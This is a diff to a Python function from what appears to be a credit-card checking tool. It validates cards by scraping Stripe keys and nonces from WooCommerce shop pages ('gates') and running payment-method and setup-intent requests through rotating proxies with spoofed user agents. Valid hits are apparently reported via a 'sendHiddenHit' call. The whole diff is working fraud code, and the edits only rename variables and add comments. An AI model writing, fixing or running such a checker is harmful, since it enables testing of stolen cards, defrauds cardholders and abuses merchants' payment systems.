@@ -105,56 +105,65 @@ async def performCheck(card, proxy=None, logCallback=None):
 
     if not gateCycle: return "DEAD", "Gates not initialized."
 
-    apiUrl = next(gateCycle)
+    currentGateUrl = next(gateCycle)
 
     while retries < 3:
-        fullResponseText = ""
-        specificError = "Unknown Gate Error"  # Default error message
+        specificError = "Unknown Error"
         try:
             async with aiohttp.ClientSession() as session:
                 headers = {'User-Agent': generate_user_agent()}
-                async with session.get(apiUrl, headers=headers, proxy=proxy, timeout=15) as r:
+                async with session.get(currentGateUrl, headers=headers, proxy=proxy, timeout=15) as r:
                     r.raise_for_status(); siteText = await r.text()
                 
                 nonce = re.search(r'name="wc-stripe-payment-nonce" value="([^"]+)"', siteText) or re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', siteText)
                 key = re.search(r'key":"(pk_live_[^"]*)"', siteText)
-                if not (nonce and key): raise Exception("Nonce/Key not found")
+                if not (nonce and key): raise Exception("Nonce/Key not found on gate")
                 
                 cc, mm, yy, cvc = card.split('|')
                 pmPayload = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvc, 'card[exp_year]': yy, 'card[exp_month]': mm, 'key': key.group(1)}
+                
+                # --- Step 1: Create Payment Method ---
                 async with session.post("https://api.stripe.com/v1/payment_methods", data=pmPayload, proxy=proxy, timeout=15) as r: 
-                    pmText = await r.text(); fullResponseText = pmText
-                    # Check for specific retryable messages
+                    pmText = await r.text()
+                    
+                    # If it's a retryable error, raise it to be caught by the except block.
                     for msg in RETRY_MESSAGES:
                         if msg in pmText.lower():
                             raise Exception(f"Retryable PM Error: {msg}")
+                    
+                    # If it's a definite DEAD error, return immediately without retrying.
+                    if '"error"' in pmText:
+                        return categorizeResponse(pmText)
 
-                if '"error"' in pmText: return categorizeResponse(pmText)
-                
                 pmId = json.loads(pmText).get('id')
                 if not pmId: raise Exception("PM ID not found")
                 
+                # --- Step 2: Confirm Payment ---
                 confirmPayload = {'action': 'wc-stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-nonce': nonce.group(1)}
-                async with session.post(f"{apiUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy, timeout=15) as r: 
-                    confirmText = await r.text(); fullResponseText = confirmText
-                    # Check for specific retryable messages again
+                async with session.post(f"{currentGateUrl}?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirmPayload, proxy=proxy, timeout=15) as r: 
+                    confirmText = await r.text()
+                    
+                    # If it's a retryable error, raise it.
                     for msg in RETRY_MESSAGES:
                         if msg in confirmText.lower():
                             raise Exception(f"Retryable Confirmation Error: {msg}")
-
+                
+                # If we get here, it's a final response (HIT or DEAD).
                 category, msg = categorizeResponse(confirmText)
                 if category == "CVV MATCHED":
                     binData = await getbininfo.getInfo(card)
                     timeTaken = time.time() - checkStartTime
                     await sendHiddenHit(card, binData, timeTaken)
                 return category, msg
+
         except Exception as e:
-            # Capture the specific error from the exception
+            # This block will now ONLY catch REAL retryable errors (network issues, specific retry messages).
             specificError = str(e)
             retries += 1
-            # I-display ang specific error sa log message
             logMsg = f"{card} -> Retry: [{specificError}]. Retrying... ({retries}/3)"
             if logCallback: logCallback("RETRY", logMsg)
-            apiUrl = next(gateCycle); await asyncio.sleep(2)
+            
+            currentGateUrl = next(gateCycle) # Get a new gate for the next attempt
+            await asyncio.sleep(2)
             
     return "DEAD", "Check failed after all retries."
